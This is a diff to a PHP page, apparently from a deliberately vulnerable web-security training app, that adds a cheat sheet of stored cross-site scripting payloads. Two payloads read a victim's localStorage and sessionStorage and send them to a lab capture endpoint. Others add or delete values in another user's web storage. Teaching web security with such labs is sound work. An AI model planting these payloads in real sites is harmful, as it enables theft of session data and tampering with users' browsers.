@@ -82,7 +82,57 @@
 			<?php 
 				$lOutput1 = '<h1>Sorry. There has been a system error.<br /><br />Please login again</h1><br/>Username<input type="text"><br/>Password<input type="text"><br/><br/><input type="submit" value="Submit"><h1>&nbsp;</h1>';	
 				echo $Encoder->encodeForHTML($lOutput1);
-			?>	
+			?>
+
+			<br/><br/>
+			<span class="report-header">Steal DOM Storage values from another users browser (intermediate)</span>
+			<br/><br/>	
+			Peristent (Stored, Second Order) Cross Site Script
+			NOTE: This version &quot;MySQL escapes&quot; the &quot;\n&quot; new-line character by doubling up the &quot;\&quot; character because &quot;\n&quot; means new-line in MySQL and this is going to be inserted into the database.
+			<br />
+<code>
+&lt;script&gt;try{var m = &quot;&quot;;var l = window.localStorage;for(i=0;i&lt;l.length;i++){
+var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\\n&quot;;}; 
+document.location=&quot;http://localhost/mutillidae/capture-data.php?html5storage=&quot; + m;}catch(e){alert(e.message);}&lt;/script&gt;
+</code>
+			<br/><br/>
+			<span class="report-header">Steal DOM Storage values from another users browser (advanced)</span>
+			<br/><br/>	
+			Peristent (Stored, Second Order) Cross Site Script
+			NOTE: This version &quot;MySQL escapes&quot; the &quot;\n&quot; new-line character by doubling up the &quot;\&quot; character because &quot;\n&quot; means new-line in MySQL and this is going to be inserted into the database.
+			<br />
+<code>
+&lt;script&gt;try{ var s = sessionStorage; var l = localStorage; var m = &quot;&quot;; 
+var lXMLHTTP; for(i=0;i&lt;s.length;i++){ m += &quot;sessionStorage(&quot; + s.key(i) + &quot;):&quot; + s.getItem(s.key(i)) + &quot;; &quot;; } 
+for(i=0;i&lt;l.length;i++){ m += &quot;localStorage(&quot; + l.key(i) + &quot;):&quot; + l.getItem(l.key(i)) + &quot;; &quot;; } 
+var lAction = &quot;http://localhost/mutillidae/capture-data.php?html5storage=&quot; + m; lXMLHTTP = new XMLHttpRequest(); 
+lXMLHTTP.onreadystatechange = function(){}; lXMLHTTP.open(&quot;GET&quot;, lAction); 
+lXMLHTTP.send(&quot;&quot;); }catch(e){} &lt;/script&gt;
+</code>
+			<br/><br/>
+			<span class="report-header">Add/Edit value to another users DOM storage</span>
+			<br/><br/>	
+			Peristent (Stored, Second Order) Cross Site Script
+			NOTE: This version &quot;MySQL escapes&quot; the &quot;\n&quot; new-line character by doubling up the &quot;\&quot; character because &quot;\n&quot; means new-line in MySQL and this is going to be inserted into the database.
+			<br />
+<code>
+&lt;script&gt;try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;
+for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\\n&quot;;};
+for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\\n&quot;;};alert(m);}catch(e){alert(e.message);};
+localStorage.setItem(&quot;AccountNumber&quot;,&quot;123456&quot;);sessionStorage.setItem(&quot;EnterpriseSelfDestructSequence&quot;,&quot;A1B2C3&quot;);
+sessionStorage.setItem(&quot;SessionID&quot;,&quot;japurhgnalbjdgfaljkfr&quot;);sessionStorage.setItem(&quot;CurrentlyLoggedInUser&quot;,&quot;1233456789&quot;);try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\\n&quot;;};alert(m);}catch(e){alert(e.message);}&lt;/script&gt;
+</code>
+			<br/><br/>
+			<span class="report-header">Delete value from another users DOM storage</span>
+			<br/><br/>	
+			Peristent (Stored, Second Order) Cross Site Script
+			NOTE: This version &quot;MySQL escapes&quot; the &quot;\n&quot; new-line character by doubling up the &quot;\&quot; character because &quot;\n&quot; means new-line in MySQL and this is going to be inserted into the database.
+			<br />
+<code>
+&lt;script&gt;try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;
+for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\\n&quot;;};
+for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\\n&quot;;};alert(&quot;HTML-5 web storage:\\n\\n&quot; + m);}catch(e){alert(e.message);};localStorage.clear();sessionStorage.clear();try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\\n&quot;;};alert(&quot;HTML-5 web storage:\\n\\n&quot; + m);}catch(e){alert(e.message);}&lt;/script&gt;
+</code>
 		</td>
 	</tr>
 	<tr><td>&nbsp;</td></tr>
